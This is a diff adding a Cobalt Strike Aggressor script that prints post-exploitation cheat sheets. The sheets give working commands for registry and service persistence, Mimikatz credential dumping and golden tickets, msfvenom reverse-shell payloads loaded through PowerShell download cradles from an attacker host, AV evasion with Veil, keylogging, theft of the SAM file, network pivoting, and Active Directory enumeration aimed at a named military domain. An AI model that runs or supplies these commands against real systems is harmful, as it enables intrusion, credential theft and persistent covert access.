@@ -1,0 +1,350 @@
+alias H_HELPERS {
+        blog($1, "	
+        H_System_Persistence
+        H_User_Persistence
+        H_Pass_the_Beacon
+        H_Golden_Ticket
+        H_Meterpreter_Hop
+        H_Mimikatz
+        H_Powerspolit
+        H_Veil-Evasion
+        H_System32_x86_vs_64
+        H_Proxis_and_Scanning
+        H_SA
+        H_DSQuery
+");
+}
+
+alias H_System_Persistence {
+        blog($1, "
+        ***System Persistence Helper***
+        --HKCU registry key--
+        reg add 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' /v EvilKey/t REG_SZ /d 'C:\\Some\\Evil\\Binary.exe'
+        
+        --Service Modification--*
+        reg query \\hklm\\system\\currentcontrolset\\services to view services and pick one that starts automatically.--(vss, or spooler)--
+        **You must drop a service executable (probably in system32)**
+        sc qc config vss (note the default binpath)
+        sc config <service name> binPath= '<path of bin executable>'
+        sc qc <service name>
+        sc query <service name>
+
+        --Service Create-- 
+        **You must drop a service executable (probably in system32)**
+        sc create <servicename> binpath= '<pathtobinaryexecutable>' DisplayName= yourdisplayname start= auto
+        if this worked you should see - [SC] CreateService SUCCESS
+        then query the service to view. sc qc <service name>
+        sc description <servicename> '<description of service>' to set the description of service
+        sc qdescription <servicename> to show verify the description worked
+        sc delete <servicename>		
+");
+}
+
+
+alias H_User_Persistence {
+        blog($1, "
+                ***User Persistance Helper***
+        --Startup File--*
+                upload file to C:\\users\\foobar\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup
+        **You must drop an exe**
+        
+                --HKCU Registry Key--
+                upload file to C:\\users\\foobar\\appdata\\roaming\\microsoft\\windows\\iecompatcache\\low
+                shell reg query hkcu\\software\\microsoft\\windows\\currentversion\\run
+                shell reg add hkcu\\software\\microsoft\\windows\\currentversion\\run /v ballsack /d 'C:\\users\\foobar\\appdata\\roaming\\microsoft\\windows\\iecompatcache\\low\\ballsack.exe'
+");
+}
+
+
+alias H_Pass_the_Beacon {
+        blog($1, "
+        ***Pass the beacon Helper***
+        spawn 'listener'
+        From CS to MSF use exploit/multi/handler
+        From MSF to CS use exploit/windows/local/payload_inject
+");
+}
+
+
+alias H_Golden_Ticket {
+        blog($1, "
+                ***Golden Ticket Helper***
+        shell klist C:\\windows\\system32\\klist (Or sysnative if in a x86 process on a x64 machine)
+                hashdump (If you haven't recently)
+                shell whoami /user (To get sid(drop last 4 digits))
+                mimikatz kerberos::golden /user:poopface.loser /domain:hectorlives.com /sid:S-1-5-21-3568320341-3509671983-3074541088 /krbtgt:f584fdfa11900aed0287211a62d3246c /endin:480 /renewmax:10080 /ptt
+                
+");
+}
+
+
+alias H_Mimikatz {
+        blog($1, "
+                ***Mimikatz Helper***
+                Long hand command for CS wdigest 
+                        mimikatz sekurlsa::wdigest
+                Long hand command for CS PTH (Pass the Hash)
+                        mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:”powershell -w hidden” ** and then steal_token of token generated
+
+        hashdump
+        mimikatz samdump::hashes
+        mimikatz sekurlsa::searchPasswords *These two commands may dump cleartext passwords
+        mimikatz sekurlsa::logonpasswords *Similar to wdigest
+        mimikatz sekurlsa::skeletonkey
+        mimikatz standard::coffee
+        mimikatz token::whoami *To show you what mimikatz thread token you are running as
+        mimikatz !lsadump::cache *To get cashed hashes of domain users who have logged onto the system	
+        mimikatz sekurlsa::tickets will list and export kerberos tickest of all sessions
+        mimikatz sekurlsa::kerberos will export the smartcard PIN's lsass has cached
+        Note- ! Will elevate mimikatz to run as system
+        For any advanced mimikatz needs visit https://adsecurity.org/?page_id=1821. They've got it all.
+");
+}
+
+
+
+alias H_Meterpreter_Hop {
+        blog($1, "
+                ***Meterpreter-Hop helper***
+        use payload/window/meterpreter/reverse_hop_http
+                set HOPURL http://192.168.32.3/hop.php **Ask if this can be a redir pointing toward http or if it should be an owned web server**
+                generate –t exe –f /tmp/msfhop.exe (this will generate an named exe msfhop.exe)
+                Implant msfhop.exe on the machine you would like to affect.
+                use exploit/multi/handler
+                set payload windows/meterpreter/reverse_hop_http
+                set HOPURL http://192.168.32.3/hop.php
+                Run msfhop.exe on the machine you would like to affect
+                **You can also host the file on your webserver and then on the target machine run \\\\webserverip\\filepath\\hop.php**
+                This should give you a meterpreter session running in a service called msfhop.exe
+");
+}
+
+alias H_Powerspolit {
+    blog($1, "
+        ***POWERSPLOIT HELPER***
+        *Helpful cmdlets in powershell
+        Get-ExecutionPolicy and Set-ExecutionPolicy
+            Values can be restricted, AllSigned, RemoteSigned, Unrestricted, Bypass, Undefined
+            to bypass-- powershell.exe -noprofile -executionpolicy -file .\script.ps1
+        Start-Service, Get-Service, Set-Service, Stop-service, Restart-Service
+        Start-Process, Get-Process, Set-Process, Stop-Process
+        Get-Hotfix
+        Import-module activedirectory
+            Get-ADDomainController, Get-ADOrganizationalUnit, Get-ADComputer, Get-ADUser
+            Get-ADServiceAccount, Get-ADDefaultDomainPasswordPolicy
+
+        *PowerSploit fundamantals
+            To acquire on Kali- git clone https://github.com//mattifestation//PowerSploit.git
+                To set up httpserver- python -m SimpleHTTPServer (The directory you run it in)
+                will now be served on port 8000 ex: http://192.168.32.3:8000
+
+        *Invoke-Shellcode
+            1. msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=192.168.32.3 LPORT=443 --platform windows -f powershell -b '0' -o /root/Desktop/msfpayload64.ps1
+            2. nano into Invoke-Shellcode.ps1 and paste the previously generated shellcode, replacing the 'shellcodex64' shell code.
+            3. host Invoke-Shellcode.ps1 (or get it over to target machine however)
+            4. IEX (New-Object Net.WebClient).DownloadString('http://192.168.32.3:8000/invoke-Shellcode.ps1')
+            5. Begin metasploit exploit/multi/handler with paylod windows/x64/meterpreter/reverse_https
+            6. Invoke-Shellcode.ps1 (A meterpreter session should spawn)
+            --or--
+            6. Start-process C:\\windows\\system32\\notepad.exe -WindowStyle Hidden
+            7. Get-Process notepad (mentally note PID)
+            8. Invoke-Shellcode -ProcessID 1234
+
+
+        *Find-AVSignture
+            1. IEX (New-Object Net.WebClient).DownloadString('http://192.168.32.2:8000/Find-AVSignature.ps1')
+            2. Find-AVSignature -StartByte 0 -EndByte max -Interval 50 -Path C:\\users\\poopface.loser\\Desktop\\meterpreter.exe -OutPath c:\\users\\poopface.loser\\Desktop\\outfile -Verbose
+            3. You can then run the outfile against your AV and whatever is flagged has a signnature so that you know where they are.
+            4. You may have to adjust the interval for optimal results (it seemed like 10000 was commonly used)
+
+        *Get-DllLoadPath
+            1. Get-DllLoadPath.ps1 is no longer part of PowerSploit's toolkit, but you can still find it at https://github.com/newrelic/nuget-agent-api/blob/master/nuget-test/modules/PETools/Get-DllLoadPath.ps1
+            2. Host the file or get it to target machine however possible.
+            3. IEX (New-Object Net.WebClient).DownloadString('http://192.168.32.3:8000/Get-DllLoadPath.ps1')
+            4. Get-DllLoadPath –ExecutablePath \“C:\\windows\\system32\\notepad.exe\” –Dllname shell32.dll
+            5. You now know where the Dll is located.
+
+        *Invoke-Portscan
+            1. Host the file or get it to target machine however possible.
+            2. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Invoke-Portscan.ps1\")
+            3. Invoke-Portscan -Hosts 192.168.32.4,192.168.32.6 -Ports \“23,22,21,8080,8000,3389\”
+            4. This will give you results similar to how nmap would. (There are also many more potential arguments)
+
+        *Invoke-ReverseDnsLookup
+            1. Host the file or get it to target machine however possible.
+            2. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Invoke-ReverseDnsLookup.ps1\")
+            3. Invoke-ReverseDnsLookup -IpRange 192.168.32.6
+            --or--
+            3. Invoke-ReverseDnsLookup -IpRange 192.168.32.0/24
+            4. Comma separated values or file input of ranges like 173.194.117.1-50 are not accepted.
+
+        *Get-HttpStatus
+            1. Use DirB
+            2. If you must use this host the file or get it to target machine however possible.
+            3. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Get_HttpStatus.ps1\")
+            4. Get-HttpStatus -Target 192.168.32.5 -Path C:\\users\\poopface.loser\\Desktop\\words.txt -Port 8000
+            5. This will respond with whether the words in the wordlist were a hit or a miss. You should probably reference a real dictionary.txt file.
+
+        *Get-Strings
+            1. Download at https://github.com/mattifestation/PowerShellArsenal
+            2. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Get-Strings.ps1\")
+            3. Get-Strings -Path C:\\users\\poopface.loser\\Desktop\\meterpreter.exe
+            4. This will return \"strings\" from in the file. Similar to the strings command in linux.
+
+        *Invoke-mimikatz
+            1. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Invoke-Mimikatz.ps1\")
+            2. Invoke-Mimikatz –DumpCreds
+            --or--
+            2. Invoke-Mimikatz -DumpCreds -Computername @(192.168.32.6, 192.168.32.4)
+            3. Full use of Mimikatz is at your fingertips and you are running in memory.
+            4. Remember, in order to do most things with Mimikatz you need to run as an elevated privledge.
+
+        *Get-Keystrokes
+            1. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Get-Keystrokes.ps1\")
+            2. Get-Keystrokes -LogPath C:\\users\\poopface.loser\\desktop\\keylogger.txt
+            --or--
+            2. Get-Keystrokes -LogPath c:\\users\\poopface.loser\\desktop\\keylogger.txt -Timeout 1
+            3. -Timeout defines how long to collect keystrokes in minutes.
+
+        *Invoke-NinjaCopy
+            1. IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.32.3:8000/Invoke-NinjaCopy.ps1\")
+            2. Invoke-NinjaCopy -Path \“C:\\Windows\\System32\\config\\SAM\” -LocalDestination \“C:\\Users\\poopface.loser\\Desktop\\SAM\”
+            3. Note- You would not be able to copy the protected SAM file with normal copy.
+
+
+")
+}
+
+alias H_Veil-Evasion {
+        blog($1, "
+                ***Veil-Evasion utilization***
+                cd into Veil directory
+                ./veil.py to run veil
+                use 1 ( in order to use evasion)
+                list (to list possible payload types (Python is a higher level language more adept to communicate with programs than with the kernal and use API calls and more likely to be caught by AV)
+                use 27 (or whatever payload number you want to use)
+                set lport (to redir ip)
+                set lhost (to proper port)
+                options (to verify changes)
+                generate (to generate payload, then answer the questions)
+                Pyinstaller will work faster
+                executable will be written to /var/lib/veil/output/compiled/payload.exe (or whatever you named your payload)
+
+                copy or move file to machine you would like to target (python -m SimpleHTTPServer works fine)
+
+                start msfconsole
+                use exploit/multi/handler
+                set lhost
+                set lport
+                run
+
+                run executable on your target machine and enjoy your session
+");
+}
+
+alias H_System32_x86_vs_64 {
+        blog($1, "
+                ***System32 helper***
+        Process/Application	Machine	Call		Destination
+                x86	x64	System32	Syswow64
+                x86	x64	Syswow64	Syswow64
+                x86	x64	Sysnative	System32
+                x64	x64	System32	System32
+                x64	x64	Syswow64	Syswow64
+            x64 or x86	x86	System32	System32
+        
+        Syswow64 is a directory. Sysnative is a redirector to 64bit system32	
+");
+}
+
+
+alias H_Proxis_and_Scanning {
+        blog($1, "
+                ***To scan from a beacon
+                In beacon 'socks 3232' to start proxy pivot (You can also view it in client/VIEW/Proxy $
+
+                setg Proxies socks4:TeamServerIP:ProxyPort
+                setg ReverseAllowProxy true
+
+                use auxiliary/scanner/smb/smb_version
+                set RHOST 192.168.32.0/24
+                set THREADS 64 *
+                exploit -j
+                        -Will return port 445 info
+
+
+                proxychains netdiscover -r 192.168.32.0/24
+                        -can be used from msf the same as from the terminal
+
+                proxychains nmap -sT -Pn -p 445,139,135 192.168.32.2-8 -oG ~/Desktop/semi-specific.nmap
+                        - -p- will scan all ports 1-65535
+
+                proxychains nmap -sT -Pn -n -v -A 192.168.32.4 -oG /root/Desktop/specific.nmap
+
+                ***To scan from a session
+                post/multi/gather/multi_command
+
+                -use this text and nano to a file for reference-
+                ipconfig /all
+                netstat -napo tcp
+                whoami /groups
+                net users 'poopface.loser' /domain
+                net groups 'domain admins' /domain
+                tasklist
+
+        **or better yet fuck that and use this**
+        cmd /c ipconfig /all & netstat -napo tcp & net users \"poopface.loser\" /domain & net groups \"domain admins\" /domain & whoami /groups & tasklist
+");
+}
+
+
+alias H_SA {
+        blog($1,"
+                ***Basic SA for CS
+                ps
+                shell whoami /groups
+                shell ipconfig /all
+                shell netstat -napo tcp
+                shell net groups \"domain admins\" /domain
+                shell net users \"poopface.loser\" /domain
+
+                ***Basic SA for Meterpreter
+                getpid
+                ps
+                getuid
+                ipconfig /all
+                netstat -napo tcp
+                (in order to run net commands you need to either pop a shell or use something along the lines of \"use post/multi/gather/multi_command\"
+
+                use post/multi/gather/multi_command
+                make a file on the desktop input the following. Then reference it in the module.
+                cmd /c ipconfig /all & netstat -napo tcp & net users \"poopface.loser\" /domain & net groups \"domain admins\" /domain & whoami /groups & tasklist
+                run that bitch and cat the created file
+
+                ***Advanced SA Q's and A's
+                hostname?               hostname |sysinfo |systeminfo
+                network?                net view | route | arp
+                domain?                 powershell net ciew (domain) | net dclist | sysinfo | net view /domain
+                dns?                    nslookup | ipconfig /all |resolve (hostname) |sysinfo
+                connections?            netstat -napo tcp | netstat -natup | arp
+                shares?                 net share
+                user?                   net loggons | echo %username% | echo %userdomain% | sysinfo | getuid | ps
+                priviledge?             net user | getuid | ps | whoami /groups
+                groups?                 net groups | net groups /domain |net groups \"domain admins\" /domain | net groups \"administrators\"
+                patchlevel?             get-hotfix | get systeminfo | wmic qfe list | dir C:\\windows\\logs\\windows\\*kb* | dir c:\\windows\\software distrobution\\download\\*kb | dir C:\\windows\\*kb
+                products?               powershell tasklist | tasklist | ps
+                pid?                    getpid | ps
+                os?                     ver | wmic os get name | wmic os get osarchitecture | wmic os get servicepackmajorversion
+
+
+")
+}
+
+
+alias H_DSQuery {
+    blog($1, "
+        nltest /domain_trusts
+        powershell dsquery * -filter \"(&(objectcategory=group)(name=enterprise admins))\" -d usmc.mil -attr member -limit 0
+        powershell dsquery * -filter \"(&(objectcategory=group)(name=enterprise admins))\" -d usmc.mil -attr * -limit 0  
+")
+}
